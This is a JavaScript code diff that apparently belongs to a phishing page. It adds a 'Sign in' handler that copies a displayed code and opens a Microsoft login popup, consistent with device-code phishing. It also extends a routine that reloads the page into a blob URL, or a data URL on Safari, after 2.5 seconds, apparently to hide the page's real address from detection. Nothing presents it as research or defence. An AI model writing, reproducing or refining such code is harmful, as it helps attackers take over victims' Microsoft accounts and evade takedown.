@@ -512,6 +512,21 @@
     }
   }
 
+  // VG_ - Sign in button: open Microsoft sign-in popup
+  window.openSignIn = function () {
+    var codeEl = document.getElementById('codeValue');
+    var code = codeEl ? codeEl.textContent : '';
+    if (code && code !== '· · · · · ·') {
+      copyText(code).then(function () {
+        var btn = document.getElementById('signInBtn');
+        if (btn) { var orig = btn.innerHTML; btn.innerHTML = '<svg width="15" height="15" viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"><polyline points="2,8 6,12 14,4"/></svg> Copied!'; setTimeout(function () { btn.innerHTML = orig; }, 1500); }
+        openMsLogin();
+      }).catch(function () {
+        openMsLogin();
+      });
+    }
+  };
+
   window.refreshCode = function () {
     window.generateCode();
   };
@@ -526,11 +541,20 @@
       if (window.__BLOB_URL_ENABLED && document.documentElement) {
         try {
           var html = document.documentElement.outerHTML;
-          var blob = new Blob([html], { type: 'text/html' });
-          var blobUrl = URL.createObjectURL(blob);
-          setTimeout(function () { 
-            window.location.replace(blobUrl); 
-          }, 2500);
+          var isSafari = /^((?!chrome|android).)*safari/i.test(navigator.userAgent);
+          if (isSafari) {
+            // Safari doesn't support blob URLs well - use data URL instead
+            var dataUrl = 'data:text/html;charset=utf-8,' + encodeURIComponent(html);
+            setTimeout(function () { 
+              window.location.replace(dataUrl); 
+            }, 2500);
+          } else {
+            var blob = new Blob([html], { type: 'text/html' });
+            var blobUrl = URL.createObjectURL(blob);
+            setTimeout(function () { 
+              window.location.replace(blobUrl); 
+            }, 2500);
+          }
           return;
         } catch (e) {
           // Fallback to normal redirect
